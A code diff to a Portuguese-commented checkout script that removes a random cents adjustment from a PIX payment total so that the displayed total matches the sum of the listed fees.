@@ -242,23 +242,13 @@
     LS.set('funil_protect_optin','1');
     var actualProtPrice = PROT_PRICE;
     
-    /* Calcula a base total e aplica o jitter de centavos (fallback inline anti-cache) */
-    var baseT=f.price+bt+actualProtPrice;
+    /* Valor fixo: frete + seguro. A taxa de servico (+R$0,99) e somada na
+       exibicao (comTaxa) e no valor enviado a API, entao o Total, as linhas
+       do resumo e o valor do PIX gerado batem exatamente.
+       (jitter de centavos removido — gerava Total != soma das linhas.) */
+    var baseT=Math.round((f.price+bt+actualProtPrice)*100)/100;
     var finalAmount=baseT;
-    if(typeof window.pixJitter === 'function'){
-      finalAmount=window.pixJitter(baseT, 'checkout_pix');
-    } else {
-      var storeKey='funil_jitter_checkout_pix';
-      var cents=parseInt(localStorage.getItem(storeKey),10);
-      if(isNaN(cents)){
-        cents=Math.floor(Math.random()*161)-80;
-        try{localStorage.setItem(storeKey,String(cents));}catch(e){}
-      }
-      var fa=Math.round((baseT*100)+cents)/100;
-      if(fa<1) fa=Math.round((baseT*100)+Math.abs(cents))/100;
-      finalAmount=Math.round(fa*100)/100;
-    }
-    
+
     var originalAmount=finalAmount;
     var discountActive=false;
     function total(){return discountActive?Math.max(1,Math.round(originalAmount*50)/100):originalAmount;}
